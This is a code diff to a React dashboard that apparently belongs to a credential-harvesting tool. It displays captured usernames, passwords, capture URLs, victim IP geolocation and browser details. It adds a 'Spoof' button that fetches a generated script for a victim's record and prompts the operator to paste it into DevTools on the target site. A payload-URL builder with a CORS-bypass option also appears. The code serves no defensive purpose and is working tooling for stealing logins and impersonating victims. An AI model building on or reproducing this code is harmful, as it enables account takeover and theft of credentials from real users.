@@ -345,7 +345,10 @@ class PersistentDrawer extends Component {
     loading: false,
     tab: 0,
     switchUserOpen: false,
-    accounts: []
+    accounts: [],
+    spoof: {
+      open: false,
+    }
   }
 
   componentWillReceiveProps(nextProps) {
@@ -396,10 +399,11 @@ class PersistentDrawer extends Component {
     this.remountMonaco()
   }
 
-  handleRecordOpen = (record) => {
+  handleRecordOpen = (record, index) => {
     this.setState({
       recordOpen: true,
-      record: record
+      record: record,
+      recordIndex: index,
     })
   }
 
@@ -480,7 +484,35 @@ class PersistentDrawer extends Component {
   }
 
 	viewJSON = () => {
-		window.open("/api/" + encodeURIComponent(this.props.token) + "/" + encodeURIComponent(this.state.currentProject.name) /*+ "&download=true"*/)
+		window.open("/api/json/" + encodeURIComponent(this.state.currentProject.name) + "?token=" + encodeURIComponent(this.props.token) /*+ "&download=true"*/)
+  }
+
+  spoofOpen = () => {
+    this.setState({
+      spoof: {
+        open: true,
+        modalOpen: true,
+        url: "/api/spoof/" + encodeURIComponent(this.state.currentProject.name) + "?index=" + this.state.recordIndex + "&token=" + encodeURIComponent(this.props.token)
+      }
+    })
+  }
+
+  spoofClose = () => {
+    this.setState({
+      spoof: {
+        ...this.state.spoof,
+        modalOpen: false,
+      }
+    })
+    // setTimeout(() => {
+    //   this.setState({
+    //     spoof: {
+    //       ...this.state.spoof,
+    //       modalOpen: false,
+    //       open: false,
+    //     }
+    //   })
+    // }, 100)
   }
 
   changeTab = (event, value) => {
@@ -639,7 +671,7 @@ class PersistentDrawer extends Component {
                                   disableTriggerFocus
                                   disableTriggerTouch
                                 >
-                                  <Button color="primary" dense onClick={() => {this.handleRecordOpen(record)}}>
+                                  <Button color="primary" dense onClick={() => {this.handleRecordOpen(record, i)}}>
                                     More
                                   </Button>
                                 </Tooltip>
@@ -658,85 +690,133 @@ class PersistentDrawer extends Component {
                     </Button>
                   </Tooltip>
                   {this.state.recordOpen ? (
-                    <Dialog
-                      fullScreen
-                      open={this.state.recordOpen}
-                      onRequestClose={this.handleRecordClose}
-                      transition={Transition}
-                    >
-                      <AppBar>
-                        <Toolbar>
-                          <IconButton color="contrast" onClick={this.handleRecordClose} aria-label="Close">
-                            <CloseIcon />
-                          </IconButton>
-                          <Typography type="title" color="inherit" className={classes.flex}>
-                            Password record for {this.state.currentProject.name}
-                          </Typography>
-                          {/* <Button color="contrast" onClick={this.handleRecordClose}>
-                            save
-                          </Button> */}
-                        </Toolbar>
-                      </AppBar>
-                      <List className={classes.recordContent}>
-                        <CopyToClipboard text={this.state.record.timestamp}
-                          onCopy={() => this.props.notify({
-                            title: "Copied to clipboard!",
-                            message: this.state.record.timestamp
-                          })}>
-                          <ListItem button>
-                            <ListItemText primary="Timestamp" secondary={<Timestamp time={this.state.record.timestamp} format='full' />} />
+                    <span>
+                      <Dialog
+                        fullScreen
+                        open={this.state.recordOpen}
+                        onRequestClose={this.handleRecordClose}
+                        transition={Transition}
+                      >
+                        <AppBar>
+                          <Toolbar>
+                            <IconButton color="contrast" onClick={this.handleRecordClose} aria-label="Close">
+                              <CloseIcon />
+                            </IconButton>
+                            <Typography type="title" color="inherit" className={classes.flex}>
+                              Password record for {this.state.currentProject.name}
+                            </Typography>
+                            <Button color="contrast" onClick={this.spoofOpen.bind(this)}>
+                              Spoof
+                            </Button>
+                          </Toolbar>
+                        </AppBar>
+                        <List className={classes.recordContent}>
+                          <CopyToClipboard text={this.state.record.timestamp}
+                            onCopy={() => this.props.notify({
+                              title: "Copied to clipboard!",
+                              message: this.state.record.timestamp
+                            })}>
+                            <ListItem button>
+                              <ListItemText primary="Timestamp" secondary={<Timestamp time={this.state.record.timestamp} format='full' />} />
+                            </ListItem>
+                          </CopyToClipboard>
+                          <Divider />
+                          <CopyToClipboard text={this.state.record.username}
+                            onCopy={() => this.props.notify({
+                              title: "Copied to clipboard!",
+                              message: this.state.record.username
+                            })}>
+                            <ListItem button>
+                              <ListItemText primary="Username" secondary={this.state.record.username} />
+                            </ListItem>
+                          </CopyToClipboard>
+                          <Divider />
+                          <CopyToClipboard text={this.state.record.password}
+                            onCopy={() => this.props.notify({
+                              title: "Copied to clipboard!",
+                              message: this.state.record.password
+                            })}>
+                            <ListItem button>
+                              <ListItemText primary="Password" secondary={this.state.record.password} />
+                            </ListItem>
+                          </CopyToClipboard>
+                          <Divider />
+                          {this.state.record.url.href ? (
+                              <span>
+                                <ListItem button onClick={() => {window.open(this.state.record.url.href).bind}}>
+                                  <ListItemText primary="Capture URL" secondary={this.state.record.url.href} />
+                                </ListItem>
+                                <Divider />
+                              </span>
+                            ) : null
+                          }
+                          <ListItem button onClick={() => {window.open("https://tools.keycdn.com/geo?host=" + this.state.record.ip.query)}}>
+                            <ListItemText primary="IP Address" secondary={`${this.state.record.ip.query}${this.state.record.ip.country ? " (" + this.state.record.ip.city + " - " + this.state.record.ip.country + ")" : ""}`} />
                           </ListItem>
-                        </CopyToClipboard>
-                        <Divider />
-                        <CopyToClipboard text={this.state.record.username}
-                          onCopy={() => this.props.notify({
-                            title: "Copied to clipboard!",
-                            message: this.state.record.username
-                          })}>
-                          <ListItem button>
-                            <ListItemText primary="Username" secondary={this.state.record.username} />
+                          <Divider />
+                          <CopyToClipboard text={`${this.state.record.browser.height}x${this.state.record.browser.width}px`}
+                            onCopy={() => this.props.notify({
+                              title: "Copied to clipboard!",
+                              message: this.state.record.browser.height + "x" + this.state.record.browser.width + "px"
+                            })}>
+                            <ListItem button>
+                              <ListItemText primary="Screen resolution" secondary={`${this.state.record.browser.height}x${this.state.record.browser.width}px`} />
+                            </ListItem>
+                          </CopyToClipboard>
+                          <Divider />
+                          <br />
+                          <ListItem>
+                            <ReactJson src={this.state.record} />
                           </ListItem>
-                        </CopyToClipboard>
-                        <Divider />
-                        <CopyToClipboard text={this.state.record.password}
-                          onCopy={() => this.props.notify({
-                            title: "Copied to clipboard!",
-                            message: this.state.record.password
-                          })}>
-                          <ListItem button>
-                            <ListItemText primary="Password" secondary={this.state.record.password} />
-                          </ListItem>
-                        </CopyToClipboard>
-                        <Divider />
-                        {this.state.record.url.href ? (
-                            <span>
-                              <ListItem button onClick={() => {window.open(this.state.record.url.href).bind}}>
-                                <ListItemText primary="Capture URL" secondary={this.state.record.url.href} />
-                              </ListItem>
-                              <Divider />
-                            </span>
-                          ) : null
-                        }
-                        <ListItem button onClick={() => {window.open("https://tools.keycdn.com/geo?host=" + this.state.record.ip.query)}}>
-                          <ListItemText primary="IP Address" secondary={`${this.state.record.ip.query}${this.state.record.ip.country ? " (" + this.state.record.ip.city + " - " + this.state.record.ip.country + ")" : ""}`} />
-                        </ListItem>
-                        <Divider />
-                        <CopyToClipboard text={`${this.state.record.browser.height}x${this.state.record.browser.width}px`}
-                          onCopy={() => this.props.notify({
-                            title: "Copied to clipboard!",
-                            message: this.state.record.browser.height + "x" + this.state.record.browser.width + "px"
-                          })}>
-                          <ListItem button>
-                            <ListItemText primary="Screen resolution" secondary={`${this.state.record.browser.height}x${this.state.record.browser.width}px`} />
-                          </ListItem>
-                        </CopyToClipboard>
-                        <Divider />
-                        <br />
-                        <ListItem>
-                          <ReactJson src={this.state.record} />
-                        </ListItem>
-                      </List>
-                    </Dialog>
+                        </List>
+                      </Dialog>
+                      {this.state.spoof.open &&
+                        <Request
+                          url={this.state.spoof.url}
+                          method='get'
+                          verbose={true}
+                        >
+                          {
+                            ({error, result, loading}) => {
+                              if (loading) {
+                                return (
+                                  <Dialog open={this.state.spoof.modalOpen} classes={{ paper: classes.transparent }}>
+                                    <CircularProgress size={60} style={{ color: indigo[50] }} />
+                                  </Dialog>
+                                )
+                              } else {
+                                return (
+                                  <div>
+                                    <Dialog open={this.state.spoof.modalOpen} onRequestClose={this.spoofClose} classes={{ paper: this.props.classes.codeDialog}}>
+                                      <SyntaxHighlighter showLineNumbers language='javascript' style={atomOneDark} height={200} className={classes.code}>
+                                        {result.text}
+                                      </SyntaxHighlighter>
+                                      <DialogActions>
+                                        <Button onClick={this.spoofClose.bind(this)} color="contrast">
+                                          Back
+                                        </Button>
+                                        <Button onClick={() => window.open(this.state.spoof.url)} color="contrast">
+                                          Raw
+                                        </Button>
+                                        <CopyToClipboard text={result.text}
+                                          onCopy={() => this.props.notify({
+                                            title: "Copied to clipboard!",
+                                            message: "Go onto the target site, and paste it into DevTools"
+                                        })}>
+                                          <Button color="contrast">
+                                            Copy
+                                          </Button>
+                                        </CopyToClipboard>
+                                      </DialogActions>
+                                    </Dialog>
+                                  </div>
+                                )
+                              }
+                            }
+                          }
+                        </Request>
+                      }
+                    </span>
                     ) : null
                   }
                 </span>
@@ -1059,7 +1139,7 @@ class Javascript extends Component {
     if (this.state.options.base64 == false) params += "&base64=false"
     if (this.state.options.bypassCors == true) params += "&bypassCors=true"
     this.setState({
-      javascriptURL: "/payload/?project=" + encodeURIComponent(this.props.parentState.currentProject.name) + params
+      javascriptURL: "/api/payload/?project=" + encodeURIComponent(this.props.parentState.currentProject.name) + params
     })
   }
 
